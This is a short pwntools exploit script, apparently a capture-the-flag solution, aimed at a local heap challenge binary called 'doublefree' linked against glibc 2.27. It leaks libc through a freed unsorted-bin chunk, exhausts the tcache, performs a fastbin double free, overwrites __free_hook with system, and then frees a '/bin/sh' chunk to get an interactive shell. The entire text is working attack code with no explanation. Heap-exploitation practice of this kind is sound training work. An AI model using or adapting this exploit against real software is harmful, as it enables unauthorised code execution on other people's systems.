from pwn import *
context.log_level="debug"
sh=process("./doublefree")
def cmd(c):
    sh.sendlineafter(b">>",str(c).encode())
def add(size,ctt):
    cmd(0)
    sh.sendlineafter(b"size:\n",str(size).encode())
    sh.sendlineafter(b"content:\n", ctt)
def dele(idx):
    cmd(1)
    sh.sendlineafter(b"idx:\n", str(idx).encode())
def show(idx):
    cmd(3)
    sh.sendlineafter(b"idx:\n", str(idx).encode())
add(0x410,b'a') #0
for i in range(9):
    add(0x40,b'a') 
#9

dele(0)
show(0)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
libcbase=leak_libc-0x3ebca0
success("libcbase:"+hex(libcbase))
libc=ELF("./libc-2.27.so")
system=libcbase+libc.sym['system']
freehook=libcbase+libc.sym['__free_hook']

for i in range(1,8):
    dele(i)
#7

dele(8)
dele(9)
dele(8)

#  9 -> 8 -> freehook
for i in range(7):
    add(0x40,b'a')
#16

add(0x40,p64(freehook)) #17
add(0x40,b'a') #18
add(0x40,b'/bin/sh\x00') #19
add(0x40,p64(system)) #20

gdb.attach(sh)
dele(19)

sh.interactive()
